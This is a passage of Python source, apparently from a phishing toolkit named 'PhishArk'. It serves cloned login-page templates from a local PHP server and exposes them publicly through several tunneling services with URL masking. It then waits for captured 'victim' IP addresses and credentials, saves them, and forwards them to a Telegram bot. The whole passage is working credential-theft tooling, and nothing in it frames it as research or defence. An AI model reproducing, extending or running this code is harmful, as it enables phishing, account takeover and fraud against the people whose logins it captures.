            index_str = str(i+1) if i >= 9 else "0" + str(i+1)
            spacing = " " * (max_length - len(site_names[i]))
            return f"{Colors.GREEN}[{Colors.WHITE}{index_str}{Colors.GREEN}] {Colors.YELLOW}{site_names[i]}{spacing}"
        first_third = total // 3 + (1 if total % 3 > 0 else 0)
        options = "\n\n"
        if total > 10:
            for i in range(first_third):
                second = i + first_third
                third = second + first_third
                options += format_option(i, 23) + format_option(second, 17) + format_option(third, 1) + "\n"
        else:
            for i in range(total):
                options += format_option(i, 20) + "\n"
        if isfile(saved_file) and Utils.read_file(saved_file) != "":
            options += f"{Colors.GREEN}[{Colors.WHITE}a{Colors.GREEN}]{Colors.YELLOW} About  {Colors.GREEN}[{Colors.WHITE}o{Colors.GREEN}]{Colors.YELLOW} AddZip  {Colors.GREEN}[{Colors.WHITE}s{Colors.GREEN}]{Colors.YELLOW} Saved   {Colors.GREEN}[{Colors.WHITE}x{Colors.GREEN}]{Colors.YELLOW} More Tools  {Colors.GREEN}[{Colors.WHITE}0{Colors.GREEN}]{Colors.YELLOW} Exit\n\n"
        else:
            options += f"{Colors.GREEN}[{Colors.WHITE}a{Colors.GREEN}]{Colors.YELLOW} About  {Colors.GREEN}[{Colors.WHITE}o{Colors.GREEN}]{Colors.YELLOW} AddZip  {Colors.GREEN}[{Colors.WHITE}x{Colors.GREEN}]{Colors.YELLOW} More Tools  {Colors.GREEN}[{Colors.WHITE}0{Colors.GREEN}]{Colors.YELLOW} Exit\n\n"
        import shlex
        if Utils.check_if_installed("lolcat"):
            safe_options = shlex.quote(options)
            Utils.run_shell(f"printf '%s' {safe_options} | lolcat")
        else:
            print(options)

    def add_zip_templates(self):
        while True:
            zip_url = input(f"\n{ASK_PROMPT}Enter the download URL of zipfile: ")
            if zip_url == "":
                Utils.print_slow(f"\n{ERROR_MSG}No URL specified!")
                break
            elif zip_url.lower() == "help":
                Utils.print_slow("\nAdd more templates by downloading a zip file of websites.")
            else:
                self.check_internet()
                os.system(f"wget -q -O sites.zip {zip_url}")
                pwd_input = input(f"\n{ASK_PROMPT}Enter the password of zipfile (if any): ")
                self.extract_file("sites.zip", SITES_DIR, pwd=pwd_input)
                remove("sites.zip")
                break

    def launch_server(self):
        self.show_logo()
        if termux_mode:
            Utils.print_slow(f"\n{INFO_MSG}Ensure hotspot is enabled on your device!")
            sleep(2)
        Utils.print_slow(f"\n{INFO2_MSG}Initializing PHP server at {local_url}...")
        for logfile in [PHP_LOG_FILE, CF_LOG_FILE, LX_LOG_FILE, LHR_LOG_FILE, SVO_LOG_FILE]:
            Utils.remove_path(logfile)
            try:
                mknod(logfile)
            except Exception:
                Utils.print_slow(f"\n{ERROR_MSG}File permission issues detected. Exiting!")
                self.polite_exit()
        php_log = open(PHP_LOG_FILE, "w")
        cf_log  = open(CF_LOG_FILE, "w")
        lx_log  = open(LX_LOG_FILE, "w")
        lhr_log = open(LHR_LOG_FILE, "w")
        svo_log = open(SVO_LOG_FILE, "w")
        self.check_internet()
        Utils.background_task(f"php -S {local_url}", stdout=php_log, stderr=php_log, cwd=SITE_DIR)
        sleep(2)
        try:
            status_code = get("http://" + local_url).status_code
        except Exception as err:
            Utils.append_to_file(err, ERROR_FILE)
            status_code = 400
        if status_code <= 400:
            Utils.print_slow(f"\n{INFO_MSG}PHP Server has started successfully!")
        else:
            Utils.print_slow(f"\n{ERROR_MSG}PHP Error! Code: {status_code}")
            self.polite_exit()
        Utils.print_slow(f"\n{INFO2_MSG}Initializing tunnelers...")
        self.check_internet()
        additional_args = ""
        if self.region:
            additional_args = f"--region {self.region}"
        if self.subdomain:
            additional_args += f" --subdomain {self.subdomain}"
        Utils.background_task(f"{self.cf_cmd} tunnel -url {local_url}", stdout=cf_log, stderr=cf_log)
        Utils.background_task(f"{self.lx_cmd} tunnel --raw-mode http --https-redirect {additional_args} -t {local_url}", stdout=lx_log, stderr=lx_log)
        if self.use_key:
            Utils.background_task(f"ssh -R 80:{local_url} localhost.run -T -n", stdout=lhr_log, stderr=lhr_log)
        else:
            Utils.background_task(f"ssh -R 80:{local_url} nokey@localhost.run -T -n", stdout=lhr_log, stderr=lhr_log)
        Utils.background_task(f"ssh -R 80:{local_url} serveo.net -T -n", stdout=svo_log, stderr=svo_log)
        sleep(10)
        cf_success = any(Utils.regex_search(r"(https://[-0-9a-z.]{4,}\.trycloudflare\.com)", Utils.read_file(CF_LOG_FILE)) for _ in range(10))
        lx_success = any(("https://" + Utils.regex_search(r"([-0-9a-z.]+\.loclx\.io)", Utils.read_file(LX_LOG_FILE))) != "https://" for _ in range(10))
        lhr_success = any(Utils.regex_search(r"(https://[-0-9a-z.]+\.lhr\.(life|pro))", Utils.read_file(LHR_LOG_FILE)) != "" for _ in range(10))
        svo_success = any(Utils.regex_search(r"(https://[-0-9a-z.]+\.serveo\.net)", Utils.read_file(SVO_LOG_FILE)) != "" for _ in range(10))
        if cf_success or lx_success or lhr_success or svo_success:
            Utils.print_slow(f"\n{INFO_MSG}Your URLs are:")
            if self.mode == "test":
                print(f"\n{INFO_MSG}URL generation completed successfully!")
                print(f"\n{INFO_MSG}CloudFlared: {cf_success}, LocalXpose: {lx_success}, LocalHR: {lhr_success}, Serveo: {svo_success}")
                self.polite_exit()
            if cf_success:
                self.url_manager(Utils.regex_search(r"(https://[-0-9a-z.]+\.trycloudflare\.com)", Utils.read_file(CF_LOG_FILE)), "CloudFlared")
            if lx_success:
                self.url_manager("https://" + Utils.regex_search(r"([-0-9a-z.]+\.loclx\.io)", Utils.read_file(LX_LOG_FILE)), "LocalXpose")
            if lhr_success:
                self.url_manager(Utils.regex_search(r"(https://[-0-9a-z.]+\.lhr\.(life|pro))", Utils.read_file(LHR_LOG_FILE)), "LocalHostRun")
            if svo_success:
                self.url_manager(Utils.regex_search(r"(https://[-0-9a-z.]+\.serveo\.net)", Utils.read_file(SVO_LOG_FILE)), "Serveo")
            if lx_success and self.tunneler.lower() in ["loclx", "lx"]:
                self.custom_masking("https://" + Utils.regex_search(r"([-0-9a-z.]+\.loclx\.io)", Utils.read_file(LX_LOG_FILE)))
            elif lhr_success and self.tunneler.lower() in ["localhostrun", "lhr"]:
                self.custom_masking(Utils.regex_search(r"(https://[-0-9a-z.]+\.lhr\.(life|pro))", Utils.read_file(LHR_LOG_FILE)))
            elif cf_success and self.tunneler.lower() in ["cloudflared", "cf"]:
                self.custom_masking(Utils.regex_search(r"(https://[-0-9a-z.]+\.trycloudflare\.com)", Utils.read_file(CF_LOG_FILE)))
            elif svo_success and self.tunneler.lower() in ["serveo", "svo"]:
                self.custom_masking(Utils.regex_search(r"(https://[-0-9a-z.]+\.serveo\.net)", Utils.read_file(SVO_LOG_FILE)))
            elif self.tunneler.lower() not in ["cf", "cloudflared", "lx", "loclx", "lhr", "localhostrun", "svo", "serveo"]:
                print(f"\n{ERROR_MSG}Unknown tunneler '{self.tunneler}' specified!")
            elif not any([cf_success, lx_success, lhr_success, svo_success]):
                print(f"\n{ERROR_MSG}None of the tunnelers succeeded!")
            elif (self.tunneler.lower() in ["cf", "cloudflared"] and not cf_success or
                self.tunneler.lower() in ["lx", "loclx"] and not lx_success or
                self.tunneler.lower() in ["lhr", "localhostrun"] and not lhr_success or
                self.tunneler.lower() in ["svo", "serveo"] and not svo_success):
                print(f"\n{ERROR_MSG}Selected tunneler '{self.tunneler}' did not return a valid URL!")

        else:
            Utils.print_slow(f"\n{ERROR_MSG}Tunneling failed! Please use your own tunneling service on port {self.port}.")
            if self.mode == "test":
                exit(1)
        self.wait_for_creds()

    def wait_for_creds(self):
        Utils.remove_path(IP_FILE)
        Utils.remove_path(CRED_FILE)
        Utils.print_slow(f"\n{INFO_MSG}{Colors.BLUE}Waiting for login info... Press {Colors.RED}Ctrl+C{Colors.CYAN} to exit")
        try:
            while True:
                if isfile(IP_FILE):
                    print(f"\n\n{SUCCESS_MSG}{Colors.BGREEN}Victim IP found!\n\007")
                    self.display_file_content(Utils.read_file(IP_FILE))
                    ipdata = Utils.read_file(IP_FILE)
                    self.send_telegram_notification(f"🌐 <b>New Victim IP</b>\n\n<pre>{ipdata}</pre>")
                    Utils.append_to_file(ipdata, MAIN_IP)
                    Utils.append_to_file(ipdata.split("\n")[0], saved_file)
                    print(f"\n{INFO2_MSG}Saved in {MAIN_IP}")
                    print(f"\n{INFO_MSG}{Colors.BLUE}Waiting for next... Press {Colors.RED}Ctrl+C{Colors.CYAN} to exit")
                    remove(IP_FILE)
                if isfile(CRED_FILE):
                    print(f"\n\n{SUCCESS_MSG}{Colors.BGREEN}Victim login info found!\n\007")
                    self.display_file_content(Utils.read_file(CRED_FILE))
                    userdata = Utils.read_file(CRED_FILE)
                    self.send_telegram_notification(f"🕵️ <b>Captured Credentials</b>\n\n<pre>{userdata}</pre>")
                    Utils.append_to_file(userdata, MAIN_CRED)
                    Utils.append_to_file(userdata, saved_file)
                    print(f"\n{INFO2_MSG}Saved in {MAIN_CRED}")
                    print(f"\n{INFO_MSG}{Colors.BLUE}Waiting for next... Press {Colors.RED}Ctrl+C{Colors.CYAN} to exit")
                    remove(CRED_FILE)
                sleep(0.75)
        except KeyboardInterrupt:
            self.polite_exit()

    def send_telegram_notification(self, text):
        try:
            payload = {
                "chat_id": TELEGRAM_CHAT_ID,
                "text": text,
                "parse_mode": "HTML"
            }
            post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage", data=payload)
        except Exception as err:
            Utils.append_to_file(err, ERROR_FILE)

    def polite_exit(self):
        self.kill_running_processes()
        Utils.print_slow(f"\n{INFO2_MSG}Thanks for using!")
        exit(0)

def parse_arguments():
    parser = ArgumentParser()
    parser.add_argument("-p", "--port", type=int, default=DEFAULT_PORT, help=f"PhishArk's server port [Default: {DEFAULT_PORT}]")
    parser.add_argument("-o", "--option", help="PhishArk's template index [Default: null]")
    parser.add_argument("-t", "--tunneler", default=DEFAULT_TUNNELER, help=f"Tunneler to be chosen [Default: {DEFAULT_TUNNELER}]")
    parser.add_argument("-r", "--region", help="Region for loclx [Default: auto]")
    parser.add_argument("-s", "--subdomain", help="Subdomain for loclx [Pro Account] (Default: null)")
    parser.add_argument("-u", "--url", help="Redirection URL after data capture [Default: null]")
    parser.add_argument("-m", "--mode", help="Mode of PhishArk [Default: normal]")
    parser.add_argument("-e", "--troubleshoot", help="Troubleshoot a tunneler [Default: null]")
    parser.add_argument("--nokey", help="Use localtunnel without ssh key [Default: False]", action="store_false")
    parser.add_argument("--kshrt", help="Show kshrt url [Default: False]", action="store_true")
    parser.add_argument("--noupdate", help="Skip update checking [Default: False]", action="store_false")
    return parser.parse_args()

def main():
    try:
        args = parse_arguments()
        tool = PhishArk(args)
        tool.verify_python_version()
        tool.install_required_modules()
        tool.main_menu()
    except KeyboardInterrupt:
        print(f"\n{INFO_MSG}Exiting...")
        exit(0)
    except Exception as err:
        Utils.append_to_file(err, ERROR_FILE)
        import traceback
        traceback.print_exc()

if __name__ == '__main__':
    main()
